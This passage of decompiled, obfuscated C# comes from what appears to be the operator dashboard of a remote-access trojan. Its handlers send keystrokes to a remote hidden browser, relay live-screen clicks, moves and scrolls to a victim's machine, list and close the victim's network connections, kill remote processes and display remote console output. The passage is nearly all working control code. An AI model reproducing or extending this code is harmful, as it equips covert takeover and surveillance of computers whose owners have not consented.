				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex8)
				{
				}
				return;
			}
			case 41:
			{
				string text11 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text11;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex9)
				{
				}
				return;
			}
			case 42:
			{
				string text12 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text12;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex10)
				{
				}
				return;
			}
			case 43:
			{
				string text13 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text13;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex11)
				{
				}
				return;
			}
			case 44:
			{
				string text14 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text14;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex12)
				{
				}
				return;
			}
			case 45:
			{
				string text15 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text15;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex13)
				{
				}
				return;
			}
			case 46:
			{
				string text16 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text16;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex14)
				{
				}
				return;
			}
			case 47:
			{
				string text17 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text17;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex15)
				{
				}
				return;
			}
			case 48:
			case 49:
			case 50:
			case 51:
			case 52:
			case 53:
			case 54:
			case 55:
			case 56:
			case 57:
				break;
			case 58:
				goto IL_EFD;
			case 59:
			{
				string text18 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text18;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex16)
				{
				}
				return;
			}
			case 60:
			{
				string text19 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text19;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex17)
				{
				}
				return;
			}
			case 61:
			{
				string text20 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text20;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex18)
				{
				}
				return;
			}
			case 62:
			{
				string text21 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text21;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex19)
				{
				}
				return;
			}
			case 63:
			{
				string text22 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text22;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex20)
				{
				}
				return;
			}
			case 64:
			{
				string text23 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text23;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex21)
				{
				}
				return;
			}
			default:
				switch (num)
				{
				case 91:
				{
					string text24 = this.string_4;
					text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
					text3 = text24;
					@class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex22)
					{
					}
					return;
				}
				case 92:
				{
					string text25 = this.string_4;
					text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
					text3 = text25;
					@class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex23)
					{
					}
					return;
				}
				case 93:
				{
					string text26 = this.string_4;
					text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
					text3 = text26;
					@class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex24)
					{
					}
					return;
				}
				case 94:
				{
					string text27 = this.string_4;
					text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
					text3 = text27;
					@class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex25)
					{
					}
					return;
				}
				case 95:
				{
					string text28 = this.string_4;
					text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
					text3 = text28;
					@class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex26)
					{
					}
					return;
				}
				case 96:
				{
					string text29 = this.string_4;
					text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
					text3 = text29;
					@class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex27)
					{
					}
					return;
				}
				default:
					switch (num)
					{
					case 123:
					{
						string text30 = this.string_4;
						text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
						text3 = text30;
						@class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex28)
						{
						}
						return;
					}
					case 124:
					{
						string text31 = this.string_4;
						text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
						text3 = text31;
						@class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex29)
						{
						}
						return;
					}
					case 125:
					{
						string text32 = this.string_4;
						text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
						text3 = text32;
						@class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex30)
						{
						}
						return;
					}
					case 126:
					{
						string text33 = this.string_4;
						text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
						text3 = text33;
						@class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex31)
						{
						}
						return;
					}
					}
					break;
				}
				break;
			}
			if (!(this.vmethod_464().Bounds.Contains(base.PointToClient(Cursor.Position)) & Operators.CompareString(this.vmethod_708().Text, "Stop", true) == 0))
			{
				return;
			}
			string text34 = this.string_4;
			text2 = "remotebrowser_key|" + e.KeyChar.ToString();
			text3 = text34;
			@class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
				return;
			}
			catch (Exception ex32)
			{
				return;
			}
			IL_EFD:
			string text35 = this.string_4;
			text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
			text3 = text35;
			@class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex33)
			{
			}
			return;
		}
		else if (this.vmethod_94().Checked & (this.vmethod_24().Bounds.Contains(base.PointToClient(Cursor.Position)) | this.vmethod_248().Bounds.Contains(base.PointToClient(Cursor.Position))))
		{
			string text36 = this.string_4;
			string text2 = "screenlive_key|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(e.KeyChar.ToString()));
			string text3 = text36;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex34)
			{
			}
			return;
		}
	}

	// Token: 0x060008CD RID: 2253 RVA: 0x00047448 File Offset: 0x00045648
	private void method_111(object sender, MouseEventArgs e)
	{
		if (this.vmethod_94().Checked)
		{
			if (e.Button == MouseButtons.Left)
			{
				string text = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(2),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_88().SelectedIndex)
				});
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
			if (e.Button == MouseButtons.Right)
			{
				string text4 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(8),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_88().SelectedIndex)
				});
				string text3 = text4;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
			if (e.Button == MouseButtons.Middle)
			{
				string text5 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(32),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_88().SelectedIndex)
				});
				string text3 = text5;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}
	}

	// Token: 0x060008CE RID: 2254 RVA: 0x00006857 File Offset: 0x00004A57
	private void method_112(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 8;
		this.method_41();
	}

	// Token: 0x060008CF RID: 2255 RVA: 0x00047910 File Offset: 0x00045B10
	private void method_113(object sender, MouseEventArgs e)
	{
		if (this.vmethod_94().Checked)
		{
			if (e.Button == MouseButtons.Left)
			{
				string text = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(4),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_88().SelectedIndex)
				});
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
			if (e.Button == MouseButtons.Right)
			{
				string text4 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(16),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_88().SelectedIndex)
				});
				string text3 = text4;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
			if (e.Button == MouseButtons.Middle)
			{
				string text5 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(64),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_88().SelectedIndex)
				});
				string text3 = text5;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}
	}

	// Token: 0x060008D0 RID: 2256 RVA: 0x00047DD8 File Offset: 0x00045FD8
	private void method_114(object sender, MouseEventArgs e)
	{
		if ((this.vmethod_292().Checked & Operators.CompareString(this.vmethod_686().Text, "Stop", true) == 0) && (e.X != this.int_1 | this.int_2 != e.Y))
		{
			Class136.Struct27 @struct = default(Class136.Struct27);
			@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
			bool flag = false;
			if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
			{
				flag = true;
			}
			long num;
			if (flag)
			{
				num = Class136.GetTickCount64();
			}
			else
			{
				num = (long)Class136.GetTickCount();
			}
			if ((double)num - Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_24().Tag)) >= 50.0)
			{
				string text = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_move|",
					Conversions.ToString(this.vmethod_24().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_24().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_88().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_88().SelectedIndex)
				});
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				PictureBox pictureBox = this.vmethod_24();
				@struct = default(Class136.Struct27);
				@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
				flag = false;
				if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
				{
					flag = true;
				}
				if (flag)
				{
					num = Class136.GetTickCount64();
				}
				else
				{
					num = (long)Class136.GetTickCount();
				}
				long num2 = num;
				pictureBox.Tag = num2;
			}
			this.int_1 = e.X;
			this.int_2 = e.Y;
		}
	}

	// Token: 0x060008D1 RID: 2257 RVA: 0x00048090 File Offset: 0x00046290
	private void method_115(object sender, MouseEventArgs e)
	{
		if (this.vmethod_94().Checked)
		{
			string text = this.string_4;
			string text2 = "screenlive_scroll|" + Conversions.ToString(e.Delta);
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008D2 RID: 2258 RVA: 0x0000686B File Offset: 0x00004A6B
	public void method_116(RawSourceWaveStream rawSourceWaveStream_0)
	{
		WaveOutEvent waveOutEvent = new WaveOutEvent();
		rawSourceWaveStream_0.Position = 0L;
		waveOutEvent.Init(rawSourceWaveStream_0);
		waveOutEvent.Play();
	}

	// Token: 0x060008D3 RID: 2259 RVA: 0x0000688D File Offset: 0x00004A8D
	private void method_117(object sender, EventArgs e)
	{
		this.vmethod_512().SendToBack();
		this.vmethod_18().SelectedIndex = 9;
		this.method_41();
	}

	// Token: 0x060008D4 RID: 2260 RVA: 0x00048134 File Offset: 0x00046334
	private void method_118(object sender, EventArgs e)
	{
		this.vmethod_718().Enabled = false;
		this.vmethod_718().Items.Clear();
		this.vmethod_512().BringToFront();
		this.vmethod_512().Visible = true;
		string text = this.string_4;
		string text2 = "con_list|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060008D5 RID: 2261 RVA: 0x000481EC File Offset: 0x000463EC
	private void method_119(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_718();
		checked
		{
			int num = gclass.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				if (gclass.Items[i].Selected)
				{
					string text = this.string_4;
					string text2 = Conversions.ToString(Operators.ConcatenateObject("con_close|", gclass.Items[i].Tag));
					string text3 = text;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			gclass = null;
		}
	}

	// Token: 0x060008D6 RID: 2262 RVA: 0x000482D4 File Offset: 0x000464D4
	public void method_120(ref bool bool_3)
	{
		if (this.vmethod_510().InvokeRequired)
		{
			this.vmethod_510().Invoke(new fDashboard.Delegate23(this.method_120), new object[]
			{
				bool_3
			});
			return;
		}
		if (bool_3)
		{
			this.vmethod_710().Text = "Stop";
			this.vmethod_710().Refresh();
			this.vmethod_352().Enabled = true;
			this.vmethod_510().Enabled = true;
			this.vmethod_710().Enabled = true;
			this.vmethod_352().Clear();
			this.vmethod_510().Clear();
			this.vmethod_510().Select();
			return;
		}
		this.vmethod_710().Text = "Start";
		this.vmethod_710().Refresh();
		this.vmethod_710().Enabled = true;
		this.vmethod_352().Enabled = false;
		this.vmethod_510().Enabled = false;
		this.vmethod_352().Clear();
		this.vmethod_510().Clear();
	}

	// Token: 0x060008D7 RID: 2263 RVA: 0x000483D4 File Offset: 0x000465D4
	public void method_121(ref string string_12)
	{
		if (this.vmethod_352().InvokeRequired)
		{
			this.vmethod_352().Invoke(new fDashboard.Delegate21(this.method_121), new object[]
			{
				string_12
			});
			return;
		}
		string text = Encoding.UTF8.GetString(Convert.FromBase64String(string_12));
		text = text.Replace("\u0001", string.Empty);
		text = text.Replace("\u0003", string.Empty);
		this.vmethod_352().AppendText(text);
		this.vmethod_352().SelectionStart = Strings.Len(this.vmethod_352().Text);
		this.vmethod_352().ScrollToCaret();
		this.vmethod_352().ReadOnly = true;
	}

	// Token: 0x060008D8 RID: 2264 RVA: 0x00048484 File Offset: 0x00046684
	private void method_122(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			if (this.vmethod_718().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_718();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						stringBuilder.Append(gclass.Items[i].Text);
						int num2 = gclass.Columns.Count - 1;
						for (int j = 1; j <= num2; j++)
						{
							stringBuilder.Append("\t" + gclass.Items[i].SubItems[j].Text);
						}
						stringBuilder.Append("\r\n");
					}
				}
				if (stringBuilder.Length > 0)
				{
					string text = stringBuilder.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x060008D9 RID: 2265 RVA: 0x00048580 File Offset: 0x00046780
	private void method_123(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			if (this.vmethod_718().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_718();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					stringBuilder.Append(gclass.Items[i].Text);
					int num2 = gclass.Columns.Count - 1;
					for (int j = 1; j <= num2; j++)
					{
						stringBuilder.Append("\t" + gclass.Items[i].SubItems[j].Text);
					}
					stringBuilder.Append("\r\n");
				}
				if (stringBuilder.Length > 0)
				{
					string text = stringBuilder.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x060008DA RID: 2266 RVA: 0x00048664 File Offset: 0x00046864
	private void method_124(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_718();
		checked
		{
			int num = gclass.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				if (gclass.Items[i].Selected)
				{
					string text = this.string_4;
					string text2 = "prc_kill|" + gclass.Items[i].SubItems[1].Text;
					string text3 = text;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			gclass = null;
		}
	}

	// Token: 0x060008DB RID: 2267 RVA: 0x00048754 File Offset: 0x00046954
	private void method_125(object sender, MouseEventArgs e)
	{
		if (this.vmethod_718().Items.Count > 0)
		{
			this.vmethod_368().Enabled = Conversions.ToBoolean(Interaction.IIf(Operators.CompareString(this.vmethod_718().SelectedItems[0].SubItems[2].Text, "TCP", true) == 0, true, false));
		}
		this.vmethod_370().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_718().Items.Count > 0, true, false));
		this.vmethod_378().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_718().SelectedItems.Count > 0, true, false));
	}

	// Token: 0x060008DC RID: 2268 RVA: 0x0004882C File Offset: 0x00046A2C
	private void method_126(object sender, MouseEventArgs e)
	{
		if (this.vmethod_474().Visible | this.vmethod_472().Visible)
		{
			this.vmethod_102().Enabled = false;
			return;
		}
		this.vmethod_102().Enabled = true;
		this.vmethod_104().Enabled = Conversions.ToBoolean(Interaction.IIf(this.string_8.Length >= 3, true, false));
		this.vmethod_294().Enabled = Conversions.ToBoolean(Interaction.IIf(this.string_8.Length >= 3, true, false));
		this.vmethod_108().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
		this.vmethod_144().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
		this.vmethod_172().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
	}

	// Token: 0x060008DD RID: 2269 RVA: 0x000068AD File Offset: 0x00004AAD
	private void method_127(object sender, EventArgs e)
	{
		this.vmethod_444().Text = "Selected: " + Conversions.ToString(this.vmethod_76().SelectedItems.Count);
	}

